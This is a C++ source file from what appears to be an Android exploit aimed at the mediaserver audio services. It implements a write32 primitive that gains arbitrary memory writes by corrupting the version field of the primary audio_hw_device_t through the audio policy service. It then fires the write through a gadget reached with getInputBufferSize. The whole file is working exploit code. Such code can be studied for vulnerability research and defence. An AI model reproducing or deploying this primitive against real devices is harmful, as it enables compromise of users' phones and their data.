#include "write32.h"
#include "primitives.h"

namespace android {

/**
 * The address of the audio_hw_device_t instance corresponding to the primary device. 
 * This is used as a base address for some calculations in the R/W methods.
 */
static uint32_t g_primary_device_address = 0;

/**
 * The current value of the write offset DWORD.
 * Since this is initially the "version" field in the audio_hw_device_t, it is initialized to 0x200.
 */
static int g_current_write_offset = 0x200;

/**
 * The offset between the AudioOutputDescriptor.mRefCount field and the audio_hw_device_t instance, in DWORDs.
 */
static int g_primary_device_offset = 0;

void set_primary_device_address(uint32_t address) {
	g_primary_device_address = address;
}

void set_primary_device_offset(int offset) {
	g_primary_device_offset = offset;
}

int write32(const sp<IAudioFlinger>& af, const sp<IAudioPolicyService>& aps, uint32_t address, uint32_t value) {

	//Making sure the needed globals are initialized
	if (g_primary_device_address == 0) {
		printf("[-] Primary device address is not initialized!\n");
		return -EINVAL;
	}
	if (g_primary_device_offset == 0) {
		printf("[-] Primary device offset is not initialized!\n");
		return -EINVAL;
	}

	if (address < g_primary_device_address) {
		printf("[-] Currently only write after the primary device are supported (%08X, %08X)\n",
			address, g_primary_device_address);
	}

	//Setting the write offset to the needed value
	int offset = address - g_primary_device_address;
	modify_value(aps,
		     g_primary_device_offset + 1, //The version field is the second DWORD in the audio_hw_device_t
		     offset - g_current_write_offset);
	g_current_write_offset = offset;

	//Performing the write
	af->getInputBufferSize(g_primary_device_address + sizeof(uint32_t) + 12, //The gadget used subtracts 12 from the address
			      (audio_format_t)0, (audio_channel_mask_t)value);
	return 0; 
}

}
